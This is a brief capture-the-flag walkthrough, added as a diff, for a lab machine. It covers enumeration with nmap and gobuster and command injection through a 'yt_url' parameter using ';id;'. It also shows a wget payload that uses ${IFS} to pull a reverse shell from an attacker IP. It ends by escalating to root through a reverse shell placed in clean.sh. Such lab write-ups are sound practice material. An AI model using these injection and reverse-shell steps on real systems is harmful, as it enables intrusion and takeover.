@@ -1,0 +1,21 @@
+Starting with nmap & gobuster 
+
+Found images , js , index.php , admin(401) , tmp , using gobuster 
+
+
+Intercept the request and only we can see is yt_url
+
+So we can perfom here Command Injection 
+
+So after trying some methods we can doo is 
+ --> ;id;
+
+ This will give us the output put the command between 2 semicolon
+
+ So we can download the reverse shell from attacker machine to target machine 
+
+ -->;wget${IFS}http://10.17.0.179/reverse_shell
+
+ ${IFS} is to tell that there is a space 
+
+ after getting reverse shell pasting an another reverse shell in clean.sh to get root shell 
